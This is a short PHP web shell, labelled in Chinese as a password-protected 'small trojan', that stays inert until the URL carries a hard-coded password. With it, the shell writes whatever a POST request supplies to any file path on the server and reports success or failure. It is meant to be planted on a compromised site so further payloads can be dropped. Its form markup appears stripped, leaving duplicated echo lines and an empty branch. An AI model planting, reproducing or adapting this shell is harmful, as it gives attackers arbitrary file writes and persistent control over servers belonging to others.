<?php
$password="keio";/**这里修改密码**/
if ($_GET[pass]==$password){
  if ($_POST)
{
  $fo=fopen($_POST["lujing"],"w");
  if(fwrite($fo,$_POST["neirong"]))
   echo "<font color=red><b>成功写入文件!</b></font>";
  else
   echo "<font color=#33CCFF><b>写入文件失败</b></font>";
  
}
else{
echo "<font color=#CCFFFF>冰源独立编译php带密码小马</font>";
}
?><?php echo $_SERVER["SCRIPT_FILENAME"]?><?php echo $_SERVER["SCRIPT_FILENAME"]?><?php
 }else{
?><?php } ?>